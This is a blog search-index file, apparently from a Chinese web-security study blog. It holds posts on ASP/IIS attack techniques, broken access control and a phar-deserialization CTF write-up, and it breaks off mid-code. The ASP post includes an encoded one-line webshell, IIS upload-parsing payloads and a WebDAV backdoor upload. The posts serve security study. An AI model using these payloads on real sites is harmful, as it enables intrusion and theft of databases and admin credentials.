<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>部分ASP安全漏洞</title>
      <link href="/2023/10/21/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/21/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="基于ASP框架下的一些网页漏洞"><a href="#基于ASP框架下的一些网页漏洞" class="headerlink" title="基于ASP框架下的一些网页漏洞"></a>基于ASP框架下的一些网页漏洞</h1><hr><ul><li>ps：ASP漏洞是个很经典的漏洞，虽然现在的网站很少出现ASP的漏洞了，但思想还是值得记录一下<br>对于一些开源的网页源码在网上都是需要一些money，就没法在虚拟机里复现搭建，但是简单记录一下其中的一些可以利用的简单漏洞</li></ul><h2 id="0x01-ASP-数据库-MDB默认下载"><a href="#0x01-ASP-数据库-MDB默认下载" class="headerlink" title="0x01 ASP-数据库-MDB默认下载"></a>0x01 ASP-数据库-MDB默认下载</h2><hr><p>解释：access数据库一般后缀名mdb（下载）、asp、asa（执行解析）<br>这是基于IIS 5.x&#x2F;6.0的解析漏洞</p><ul><li>目录解析:在网站下建立文件夹的名称中带有.asp，.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。IIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。</li></ul><p>IIS6.0把asp、asa、cdx、cer解析成asp文件原因是它们都默认用asp.dll文件来执行的，并且<strong>iis不能即系MDB文件</strong>，所以会被当成普通文件下载<br><img src="/images/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/1.png"><br>以动易网络cms为例，只要网站没有修改数据库文件，<strong>仍然使用默认配置名称</strong>，那么就可以直接访问下载，我们因此拿到数据库中的admin账号密码，可以获取权限</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;192.168.49.146&#x2F;Database&#x2F;PowerEasy2006.mdb #获取数据库http:&#x2F;&#x2F;192.168.49.146&#x2F;Admin&#x2F;Admin_Login.asp #进入管理员登入界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然这只是在没改配置名称的情况下才可以用</p><h2 id="0x02-ASP-数据库-ASP后门植入连接"><a href="#0x02-ASP-数据库-ASP后门植入连接" class="headerlink" title="0x02 ASP-数据库-ASP后门植入连接"></a>0x02 ASP-数据库-ASP后门植入连接</h2><hr><p>以aspcms为例，它的数据库后缀是asp，所以IIS会把它当做可执行文件来执行，我们可以通过访问他的留言页面，写入加密（Uncode）后的一句话木马并用菜刀连接就行<br>木马：</p><pre class="line-numbers language-none"><code class="language-none">┼攠數畣整爠煥敵瑳∨≡┩愾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然这也要保证他的数据库路径和名称没有改变</p><h2 id="0x03-ASP-中间件-IIS短文件名探针-安全漏洞"><a href="#0x03-ASP-中间件-IIS短文件名探针-安全漏洞" class="headerlink" title="0x03 ASP-中间件-IIS短文件名探针-安全漏洞"></a>0x03 ASP-中间件-IIS短文件名探针-安全漏洞</h2><hr><p>同样以ASPCMS为例，在不知道数据库获取其他文件的路径时可以采用iis_shortname_Scan.py脚本进行扫描，<strong>可以获取文件的前6位名字</strong><br>效果如下：</p><pre class="line-numbers language-none"><code class="language-none">E:\python2.7&gt;python2.exe .&#x2F;IIS_shortname_Scanner-master\IIS_shortname_Scanner-master&#x2F;IIS_shortname_Scan.py  http:&#x2F;&#x2F;192.168.49.146:81&#x2F;Server is vulnerable, please wait, scanning...[+] &#x2F;a~1.*      [scan in progress][+] &#x2F;p~1.*      [scan in progress][+] &#x2F;t~1.*      [scan in progress][+] &#x2F;ad~1.*     [scan in progress][+] &#x2F;pr~1.*     [scan in progress][+] &#x2F;te~1.*     [scan in progress][+] &#x2F;adm~1.*    [scan in progress][+] &#x2F;pro~1.*    [scan in progress][+] &#x2F;tem~1.*    [scan in progress][+] &#x2F;admi~1.*   [scan in progress][+] &#x2F;prod~1.*   [scan in progress][+] &#x2F;temp~1.*   [scan in progress][+] &#x2F;admin~1.*  [scan in progress][+] &#x2F;produ~1.*  [scan in progress][+] &#x2F;templ~1.*  [scan in progress][+] &#x2F;admin_~1.* [scan in progress][+] &#x2F;produc~1.* [scan in progress][+] &#x2F;templa~1.* [scan in progress][+] &#x2F;admin_~1   [scan in progress][+] Directory &#x2F;admin_~1 [Done][+] &#x2F;produc~1   [scan in progress][+] Directory &#x2F;produc~1 [Done][+] &#x2F;templa~1   [scan in progress][+] Directory &#x2F;templa~1 [Done]----------------------------------------------------------------Dir:  &#x2F;admin_~1Dir:  &#x2F;produc~1Dir:  &#x2F;templa~1----------------------------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-ASP-中间件-IIS文件上传解析-安全漏洞"><a href="#0x04-ASP-中间件-IIS文件上传解析-安全漏洞" class="headerlink" title="0x04 ASP-中间件-IIS文件上传解析-安全漏洞"></a>0x04 ASP-中间件-IIS文件上传解析-安全漏洞</h2><hr><p>ISS目录解析漏洞：对于Windows 2003 IIS 6.0并<strong>不是一个只对文件最后一个后缀来判断文件运行方式</strong>，对于.asp后缀的文件夹，IIS会将该文件的内部文件都当做.asp文件来执行。即<code>http://192.168.49.146:81/a.asp/1.jpg</code>中1.jpg会被当做asp来执行，也就是说我们上传一个木马文件，任意改后缀都可以执行，当然<strong>IIS6.0 默认的可执行文件除了asp还包含asa\cer\cdx这三种</strong>。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;&#x2F;文件名解析http:&#x2F;&#x2F;192.168.49.146:81&#x2F;a.asp;.jpg&#x2F;&#x2F;文件目录解析http:&#x2F;&#x2F;192.168.49.146:81&#x2F;a.asp&#x2F;1.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-ASP-中间件-IIS配置目录读写-安全配置"><a href="#0x05-ASP-中间件-IIS配置目录读写-安全配置" class="headerlink" title="0x05 ASP-中间件-IIS配置目录读写-安全配置"></a>0x05 ASP-中间件-IIS配置目录读写-安全配置</h2><hr><p>在web服务扩展中开启了WebDAV，配置了可以写入的权限，存在任意文件写入漏洞。<br><img src="/images/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/2.png"><br>步骤：利用桂林老兵iiswrite，用PUT&#x2F;MOVE往服务器传后门文件，然后改文件名使用菜刀连接<br>使用iisputscanner扫描：<br><img src="/images/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/3.png"><br>test.txt无法被iis解析，用MOVE改为shell.asp;.txt成功：<br><img src="/images/%E9%83%A8%E5%88%86ASP%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/4.png"></p><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_44867432/article/details/122365743">https://blog.csdn.net/qq_44867432/article/details/122365743</a><br><a href="https://blog.csdn.net/weixin_68243135/article/details/127865391">https://blog.csdn.net/weixin_68243135/article/details/127865391</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>水平、垂直逻辑越权漏洞</title>
      <link href="/2023/10/20/%E6%B0%B4%E5%B9%B3%E3%80%81%E5%9E%82%E7%9B%B4%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/20/%E6%B0%B4%E5%B9%B3%E3%80%81%E5%9E%82%E7%9B%B4%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。<br>该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限才能访问到的页面或数据。<br>在实际的代码审计中，这种漏洞往往很难通过工具进行自动化监测，因此在实际应用中危害很大。<br>目前有两种漏洞类型：<strong>“水平和垂直”</strong></p><ul><li>水平漏洞：通过访问普通用户，进而访问其他同等级的用户，获取其电脑信息</li><li>垂直漏洞：同过访问普通用户，进而访问管理员用户，对管理员账户信息进行泄露<br>附图：<br><img src="/images/%E6%B0%B4%E5%B9%B3%E3%80%81%E5%9E%82%E7%9B%B4%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png"></li></ul><h2 id="漏洞产生原理："><a href="#漏洞产生原理：" class="headerlink" title="漏洞产生原理："></a>漏洞产生原理：</h2><ul><li>1、代码逻辑：代码接受前台传输的数据，选择性的显示用户对应权限的页面内容，并没有真实的对用户对应的权限进行严格的规定</li><li>2、数据库：不同权限的用户都存在在数据库的一个表中</li></ul><p>#越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定</p><h2 id="修复方案及建议："><a href="#修复方案及建议：" class="headerlink" title="修复方案及建议："></a>修复方案及建议：</h2><pre class="line-numbers language-none"><code class="language-none">1.前后端同时对用户输入信息进行校验，双重验证机制2.调用功能前验证用户是否有权限调用相关功能3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限4.直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体利用演示：参考博客<a href="https://blog.csdn.net/weixin_45441315/article/details/119848189">https://blog.csdn.net/weixin_45441315/article/details/119848189</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2023/08/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/08/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><hr><p>ps：8月份因为学车好久没有更新博客了，不过拿到了驾照，nice。</p><hr><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="phar文件结构："><a href="#phar文件结构：" class="headerlink" title="phar文件结构："></a>phar文件结构：</h3><ul><li><p><strong>1.stub</strong><br>phar文件的表示，类似于gif文件的GIF89a，以 xxx<?php xxx;__HALT__COMPILER();?>为固定形式，前面内容可以变，点必须以__HALT__COMPILER();?&gt;结尾。</p></li><li><p><strong>2.a mainfest describing the contents</strong><br>该部分是phar文件中被压缩的文件的一些信息，其中meta-data部分的信息会被序列化，即执行serialize()函数，而phar:&#x2F;&#x2F;就相当于对这部分的内容进行反序列化，此处也正是漏洞点所在。</p></li><li><p><strong>3.the file contents</strong><br>这部分存储的是文件的内容，在没有其它特殊要求的情况下，这里面的内容不做约束。</p></li><li><p><strong>4.a signature for verifying Phar integrity</strong><br>数字签名。放在最末。</p></li></ul><hr><h2 id="phar反序列化使用前提条件"><a href="#phar反序列化使用前提条件" class="headerlink" title="phar反序列化使用前提条件"></a>phar反序列化使用前提条件</h2><hr><ul><li><p><strong>1.phar文件可上传</strong></p></li><li><p><strong>2.文件流操作函数如file_exists(),file_get_content(),fopne()要有可利用的魔法方法作为“跳板”。</strong></p></li><li><p><strong>3.文件流参数可控,且phar:&#x2F;&#x2F;协议可用。</strong></p></li></ul><h2 id="例题：-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#例题：-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="例题：[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>例题：[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><hr><p>老样子开头先注册，登入，发现可以上传文件，本来以为是文件上传漏洞，但不是，因为没有给出上传后的文件地址。</p><p>然后下载文件抓包，发现只要改变filename就可以任意文件下载:<br><img src="/images/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"><br>通过这样获取源代码<br>class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token 